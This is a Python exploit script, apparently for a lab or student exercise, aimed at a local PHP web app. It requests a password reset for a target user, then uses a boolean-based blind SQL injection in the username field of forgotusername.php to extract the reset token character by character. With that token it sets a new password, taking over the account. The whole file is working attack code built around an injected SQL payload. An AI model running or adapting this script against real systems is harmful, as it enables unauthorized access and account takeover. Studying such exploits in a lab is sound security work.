import requests
import string

url_forgot = "http://localhost:8000/forgotpassword.php"
url_check  = "http://localhost:8000/forgotusername.php"
url_reset  = "http://localhost:8000/resetpassword.php"

alphabet = string.digits + string.ascii_letters
target_user = "user1"
new_password = "StudentiPobedjuju123!"

# generating password reset token for target user
res = requests.post(url_forgot, data={"username": target_user})
if "Email sent!" not in res.text:
    print("Failed to generate token")
    exit()
print("Reset token generated")

# extracting token character by character
token = ""
print("Extracting token: ", end='', flush=True)

for i in range(1, 33):
    found = False
    for c in alphabet:
        # injecting into username field to leak token from tokens table
        payload = (
            f"{target_user}' AND (SELECT SUBSTR(token,{i},1) FROM tokens "
            f"WHERE uid=(SELECT uid FROM users WHERE username='{target_user}') "
            f"ORDER BY tid LIMIT 1)='{c}';--"
        )
        r = requests.post(url_check, data={"username": payload})
        if "User exists!" in r.text:
            token += c
            print(c, end='', flush=True)
            found = True
            break
    if not found:
        break

print(f"\nToken: {token}")

if len(token) < 32:
    print("Incomplete token, exiting")
    exit()

# reseting password using extracted token
res = requests.post(url_reset, data={
    "token": token,
    "password1": new_password,
    "password2": new_password
})

if "Password changed!" in res.text:
    print(f"Password changed")
else:
    print("Password reset failed")
